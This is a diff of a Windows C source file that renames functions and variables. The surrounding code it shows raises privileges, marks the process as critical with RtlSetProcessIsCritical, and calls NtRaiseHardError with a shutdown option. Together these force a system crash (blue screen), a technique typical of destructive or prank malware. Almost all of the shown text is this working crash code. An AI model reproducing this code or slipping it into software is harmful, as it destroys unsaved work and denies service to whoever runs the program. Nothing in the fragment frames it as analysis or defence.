@@ -14,7 +14,7 @@ pRTLSETPROCESSISCRITICAL RtlSetProcessIsCritical;
 typedef NTSTATUS(NTAPI* pNTRAISEHARDERROR)(NTSTATUS, ULONG, ULONG, PVOID*, ULONG, PUINT);
 pNTRAISEHARDERROR NtRaiseHardError;
 
-BOOL ImportNTDLLFunctions(VOID) {
+BOOL fnImportNTDLLFunctions(VOID) {
 	HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
 	if (hNtdll) {
 		RtlAdjustPrivilege = (pRTLADJUSTPRIVILEGE)GetProcAddress(hNtdll, "RtlAdjustPrivilege");
@@ -53,10 +53,10 @@ BOOL ImportNTDLLFunctions(VOID) {
 	return TRUE;
 }
 
-BOOL NTSetProcessIsCritical(BOOLEAN blIscritical) {
+BOOL fnNTSetProcessIsCritical(BOOLEAN blIsCritical) {
 	BOOLEAN bl;
 	if (!RtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, TRUE, FALSE, &bl)) {
-		if (!RtlSetProcessIsCritical(blIscritical, NULL, FALSE)) {
+		if (!RtlSetProcessIsCritical(blIsCritical, NULL, FALSE)) {
 			return TRUE;
 		} else {
 #ifdef DEBUG_MSG
@@ -74,11 +74,11 @@ BOOL NTSetProcessIsCritical(BOOLEAN blIscritical) {
 	return FALSE;
 }
 
-BOOL NTRaiseHardError(VOID) {
+BOOL fnNTRaiseHardError(VOID) {
 	BOOLEAN bl;
 	if (!RtlAdjustPrivilege(SE_SHUTDOWN_PRIVILEGE, TRUE, FALSE, &bl)) {
-		UINT ui;
-		if (NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL, OPTION_SHUTDOWN_SYSTEM, &ui)) {
+		UINT u;
+		if (NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL, OPTION_SHUTDOWN_SYSTEM, &u)) {
 #ifdef DEBUG_MSG
 			MessageBox(NULL, L"Failed to raise HardError", L"NtRaiseHardError", MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
 #endif // DEBUG_MSG
